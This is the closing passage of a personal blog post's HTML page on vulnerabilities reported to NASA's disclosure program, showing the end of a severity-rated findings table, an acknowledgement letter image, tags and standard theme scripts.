style=color:orange><strong>P3</strong></span></td></tr><tr><td>Session Fixation + CSRF + Self-Stored XSS <em>(Charizard)</em></td><td><span style=color:red><strong>P2</strong></span></td></tr></tbody></table><p><img alt=Evo loading=lazy src=/images/articles/nasa-vdp/gif/evolution.gif></p><h1 id=letter-of-acknowledgement>Letter of Acknowledgement<a hidden class=anchor aria-hidden=true href=#letter-of-acknowledgement>#</a></h1><p><img alt=LoA loading=lazy src=/images/articles/nasa-vdp/LoA.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/nasa/>NASA</a></li><li><a href=http://localhost:1313/tags/vdps/>VDPs</a></li><li><a href=http://localhost:1313/tags/bug-bounty/>Bug Bounty</a></li><li><a href=http://localhost:1313/tags/bugcrowd/>Bugcrowd</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Giacomo Lenzini</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>